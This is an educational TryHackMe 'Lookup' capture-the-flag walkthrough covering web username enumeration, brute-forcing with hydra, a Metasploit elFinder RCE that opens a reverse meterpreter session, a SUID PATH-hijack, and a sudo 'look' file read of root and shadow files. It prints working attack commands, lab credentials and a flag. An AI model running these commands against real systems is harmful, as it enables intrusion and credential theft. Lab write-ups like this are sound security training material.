# Lookup — TryHackMe Walkthrough & Study Notes

> **Category:** Linux · Web & Privesc · Easy
> A complete walkthrough — from a blank Apache page to a root shell, via username enumeration, an elFinder RCE, a SUID PATH-hijack, and a sudo GTFOBin.

| | |
|---|---|
| **Target** | `10.128.179.115` |
| **Vhosts** | `lookup.thm` · `files.lookup.thm` |
| **Software** | elFinder `2.1.47` |
| **User** | `think` |

**Attack path:**
`nmap recon` → `/etc/hosts` vhost → username enumeration (ffuf) → password brute-force (hydra) → elFinder exiftran RCE → SUID `pwm` PATH-hijack → ssh as `think` (user flag) → `sudo look` GTFOBin (root flag).

---

## Table of contents

1. [Recon & scanning](#01--recon--scanning)
2. [Virtual hosts & the /etc/hosts file](#02--virtual-hosts--the-etchosts-file)
3. [Username enumeration](#03--username-enumeration)
4. [Password brute-force](#04--password-brute-force)
5. [elFinder RCE — the foothold](#05--elfinder-rce--the-foothold)
6. [SUID pwm → user think](#06--suid-pwm--user-think)
7. [sudo look → root](#07--sudo-look--root)
8. [Cheat sheet — full kill chain](#cheat-sheet--full-kill-chain)
9. [Lessons learned](#lessons-learned)

---

## 01 · Recon & scanning

**Tool:** `nmap`

A full-port service scan reveals the two things Lookup exposes: SSH and an Apache web server that redirects to a hostname.

### Full TCP service + script scan

```bash
# -sV service versions · -sC default scripts · -p- all 65535 ports
nmap -sV -sC -p- 10.128.179.115
```

Open ports: **22/tcp (OpenSSH)** and **80/tcp (Apache 2.4.41, Ubuntu)**. The web server responds to the hostname `lookup.thm` rather than the raw IP.

> 💡 **TIP** — Confirm reachability first with `ping -c 3 10.128.179.115`. On Lookup it returned 0% loss, so any "site won't load" issue was DNS/vhost, not connectivity.

---

## 02 · Virtual hosts & the /etc/hosts file

**Focus:** `/etc/hosts`

Apache serves the site by name. Browsing the raw IP gives a bare "Not Found"; the login page appears only once your machine can resolve `lookup.thm`.

### Map the hostname locally

```bash
echo "10.128.179.115 lookup.thm" | sudo tee -a /etc/hosts
```

Then browse to `http://lookup.thm` — the **Login** page loads.

### Add the second vhost (needed after Phase 4)

```bash
echo "10.128.179.115 files.lookup.thm" | sudo tee -a /etc/hosts
```

> ⚠️ **TRAP** — Logging in as a valid user redirects to a second vhost, `files.lookup.thm`, which also needs a hosts entry. The hosts file is checked *before* DNS, so switching your nameserver to 8.8.8.8 does nothing for a `.thm` name — only the hosts entry makes it resolve.

---

## 03 · Username enumeration

**Tool:** `ffuf`

The login form leaks account existence through its error messages. Observe the difference by hand, then automate.

### Observe the tell (manual)

```bash
curl -s -X POST -d "username=admin&password=x"        http://lookup.thm/login.php
curl -s -X POST -d "username=doesnotexist&password=x" http://lookup.thm/login.php
```

```
admin        -> "Wrong password. Please try again."
doesnotexist -> "Wrong username or password. Please try again."
```

Different messages mean the app reveals which usernames are real. The distinctive string for an **invalid** user is `Wrong username`.

### Automate with ffuf

Fuzz the `username` field and **filter out** every response containing the invalid-user string. What survives is a list of real accounts.

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -X POST \
     -d "username=FUZZ&password=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://lookup.thm/login.php \
     -fr "Wrong username"
```

```
jose    [Status: 200, Size: 62, Words: 8, Lines: 1]
admin   [Status: 200, Size: 62, Words: 8, Lines: 1]
```

| Flag | Meaning |
|------|---------|
| `-w` | Wordlist fed into the `FUZZ` keyword |
| `-d` | POST body; `FUZZ` marks the injection point |
| `-H` | Form content-type — required or PHP won't parse the body |
| `-fr` | Filter **out** responses matching this regex (the invalid-user text) |

> 💡 **TIP** — If `-fr` returns everything or nothing, the filter string is wrong. Fall back to filtering by size or status: `-fs 62` / `-fc 200`.

**Result:** two valid usernames — `jose` and `admin`. `jose` is the interesting one.

---

## 04 · Password brute-force

**Tool:** `hydra`

With a confirmed username, throw `rockyou` at the login form. The failure-string tells hydra when it has *not* succeeded.

### http-post-form attack

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt \
      lookup.thm http-post-form \
      "/login.php:username=^USER^&password=^PASS^:Wrong password"
```

```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
```

| Part | Meaning |
|------|---------|
| `-l` / `-P` | Single login `jose` · password list |
| part 1 | `/login.php` — the POST path |
| part 2 | `username=^USER^&password=^PASS^` — hydra swaps the markers |
| part 3 | `Wrong password` — the **failure** condition to keep trying |

> ⚠️ **GOTCHA** — Getting the markers wrong (e.g. `^USER^` where `^PASS^` belongs, or omitting the password field) builds a malformed body and a *194-hour* ETA. A sane ETA is your sign the form string is correct.

**Credentials:** `jose : password123`. Logging in redirects to `files.lookup.thm` (add it to hosts — see Phase 2).

---

## 05 · elFinder RCE — the foothold

**Vulnerability:** CVE-2019-9194 (elFinder command injection)

`files.lookup.thm` runs **elFinder 2.1.47**, a web file manager with a command-injection bug in its PHP connector. The URL `/elFinder/elfinder.html` gives away both the software and its path.

### First attempt — the archive module (fails on this box)

```
use exploit/linux/http/elfinder_archive_cmd_injection
set RHOSTS files.lookup.thm
set RPORT 80
set TARGETURI /elFinder/
set LHOST <your tun0 IP>
run
```

```
[+] The target appears to be vulnerable. elFinder running version 2.1.47
[-] Request failed: {"error":["errArchive","errArcType"]}
[-] Exploit aborted: Archive was not created
```

The archive method depends on an archiver type this install doesn't offer — a known rough edge. Don't fight it; pivot to the other elFinder module.

### Winning path — the exiftran module

```
# search elfinder → pick the php_connector_exiftran module
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set RPORT 80
set TARGETURI /elFinder/
set LHOST 192.168.170.52   # your tun0 IP: ip addr show tun0
set LPORT 4444
run
```

```
meterpreter > Meterpreter session opened
Listing: /var/www/files.lookup.thm/public_html/elFinder/php
```

> ⚠️ **BIND** — If `run` throws `Rex::BindFailed … address already in use (0.0.0.0:4444)`, a stray `nc -lvnp 4444` owns the port. Kill the netcat (Ctrl+C) or `set LPORT 4445`. You don't need a separate listener — Metasploit provides its own handler.

> 🔑 **WHY IT WORKS** — elFinder's connector passes an attacker-controlled filename into a shell call (image rotation via `exiftran`) without sanitising it. A filename containing shell metacharacters executes as the web user (`www-data`).

### Stabilise the shell

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
id   # uid=33(www-data)
```

---

## 06 · SUID pwm → user think

**Technique:** PATH hijack

As `www-data` you can't read think's files. A custom SUID-root binary, `/usr/sbin/pwm`, calls `id` by bare name — so you can hijack `$PATH` to make it read think's password store.

### Enumerate SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Almost all results are standard (`passwd, su, sudo, mount…`). The odd one out is `/usr/sbin/pwm` — a non-standard "password manager" binary.

### Understand pwm's logic

```
$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

It runs **`id`** (no absolute path) → derives the username → reads `/home/<user>/.passwords`. Because it searches `$PATH` for `id`, we control what `id` returns.

### Hijack `id` via PATH

```bash
cd /tmp
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > id
chmod +x id
export PATH=/tmp:$PATH
id                        # now prints think — hijack live
/usr/sbin/pwm             # reads /home/think/.passwords as root
```

`pwm` now dumps think's entire `.passwords` file — a ~49-line candidate password list.

> 🔑 **PATH HIJACK** — A SUID program that calls a command by bare name (`id`, not `/usr/bin/id`) trusts `$PATH`. Prepend a writable dir with your own fake command, and the root-privileged binary runs your code / uses your output.

### Save the list & crack SSH

```bash
# on target
/usr/sbin/pwm > /tmp/think_passwords.txt 2>/dev/null
```

```
# meterpreter — pull to Kali
download /tmp/think_passwords.txt /home/kali/think_passwords.txt
```

```bash
# on Kali — strip pwm's two [!] header lines, then crack SSH
grep -v "^\[" /home/kali/think_passwords.txt > /home/kali/wordlist.txt
hydra -l think -P /home/kali/wordlist.txt lookup.thm ssh
```

```
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
```

### Log in & grab the user flag

```bash
ssh think@lookup.thm      # password: josemario.AKA(think)
cat ~/user.txt
```

**USER FLAG:** `38375fb4dd8baa2b2039ac03d92b820e`

---

## 07 · sudo look → root

**Technique:** GTFOBins (`look`)

think can run one command as root. `look` reads arbitrary files, so root-level `look` = read any file on the box, including the root flag.

### Check sudo rights

```bash
sudo -l
```

```
User think may run the following commands on ip-10-128-179-115:
    (ALL) /usr/bin/look
```

### Read any root-owned file (GTFOBins)

`look` prints lines from a file that start with a given prefix. An empty prefix matches every line, dumping the whole file — as root.

```bash
sudo /usr/bin/look '' /root/root.txt
```

**ROOT FLAG:** `captured — paste your instance value here` (unique per instance)

> 💡 **BONUS** — The same primitive reads password hashes for offline cracking: `sudo /usr/bin/look '' /etc/shadow`. Reading `/root/root.txt` already completes the box. 🏆

---

## Cheat sheet — full kill chain

Every command that worked, in order.

```bash
# 1 · RECON
nmap -sV -sC -p- 10.128.179.115
echo "10.128.179.115 lookup.thm files.lookup.thm" | sudo tee -a /etc/hosts

# 2 · USERNAME ENUM
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -X POST -d "username=FUZZ&password=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://lookup.thm/login.php -fr "Wrong username"

# 3 · PASSWORD BRUTE-FORCE  ->  jose:password123
hydra -l jose -P /usr/share/wordlists/rockyou.txt \
      lookup.thm http-post-form \
      "/login.php:username=^USER^&password=^PASS^:Wrong password"

# 4 · elFINDER RCE (foothold as www-data)
msfconsole -q
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm ; set TARGETURI /elFinder/
set LHOST tun0 ; set LPORT 4444 ; run
shell ; python3 -c 'import pty; pty.spawn("/bin/bash")'

# 5 · SUID pwm PATH-HIJACK -> think's password list
cd /tmp
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > id
chmod +x id ; export PATH=/tmp:$PATH
/usr/sbin/pwm > /tmp/think_passwords.txt 2>/dev/null
# download to Kali, then:
grep -v "^\[" think_passwords.txt > wordlist.txt
hydra -l think -P wordlist.txt lookup.thm ssh      # think:josemario.AKA(think)

# 6 · USER FLAG
ssh think@lookup.thm
cat ~/user.txt

# 7 · ROOT via sudo look (GTFOBin)
sudo -l                                    # (ALL) /usr/bin/look
sudo /usr/bin/look '' /root/root.txt
```

### Arsenal

| Tool | Role |
|------|------|
| `nmap` | Port & service discovery (`-sC -sV -p-`) |
| `ffuf` | Web fuzzing; enumerate users via response-filtering (`-fr`) |
| `hydra` | Online brute-force; `http-post-form` & `ssh` modules |
| `metasploit` | elFinder exiftran RCE module for the foothold |
| `find / -perm -4000` | SUID hunt — spots the odd `pwm` binary |
| GTFOBins | Reference for abusing `look`, `sudo`, SUID bins |

---

## Lessons learned

1. **Follow the evidence, not the famous attack.** The login was screaming *enumeration*, yet SQLi felt tempting. sqlmap itself confirmed "no parameters to test." Match the exploit to what you observed.
2. **Observe before you automate.** Two `curl` requests exposed the error-message difference that made the whole ffuf attack possible. Manual testing sets up the tooling correctly.
3. **When a tool fails, read *why*.** The archive module's `errArcType` pointed straight to a different, working elFinder module. Error text is a lead, not a dead end.
4. **One listener per port.** `Rex::BindFailed` just meant netcat still held 4444. Metasploit brings its own handler — you rarely need both.
5. **SUID + relative command = PATH hijack.** `pwm` calling bare `id` is the textbook pattern. Always check *how* a custom SUID binary invokes helpers.
6. **A leaked password store is a wordlist.** `.passwords` wasn't one secret — it was 49 candidates to feed hydra over SSH.
7. **Know your GTFOBins.** A single innocuous-looking sudo entry (`look`) is a full arbitrary-file-read as root.
8. **Mind which host you're on.** Target shell vs. Kali — `/home/kali/…` paths only exist on Kali; `download` bridges the two.

---

*Educational write-up for an authorised lab environment. Techniques are for legal, sanctioned testing only.*
